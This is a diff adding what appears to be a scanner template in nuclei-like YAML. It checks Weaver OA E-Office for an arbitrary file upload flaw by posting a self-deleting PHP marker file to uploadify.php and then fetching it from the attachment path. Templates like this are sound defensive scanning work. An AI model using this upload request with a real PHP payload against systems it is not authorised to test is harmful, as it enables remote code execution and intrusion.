@@ -1,0 +1,39 @@
+id: weaver-jquery-file-upload
+brief:
+    title: OA E-Office jQuery - Arbitrary File Upload
+    by: SleepingBag945
+    level: critical
+    about: Arbitrary File Upload in OA E-Office jQuery.
+    label:
+        - weaver
+        - e-office
+        - oa
+        - instrusive
+        - rce
+        - intrusive
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/inc/jquery/uploadify/uploadify.php'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/inc/jquery/uploadify/uploadify.php'
+      head:
+        Accept: '*/*'
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+      body: |-
+        ------WebKitFormBoundaryjetvpuye
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo "{{string}}";unlink(__FILE__);?>
+        ------WebKitFormBoundaryjetvpuye--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/attachment/{{attachmentID}}/{{filename}}.php'
+      signs: []
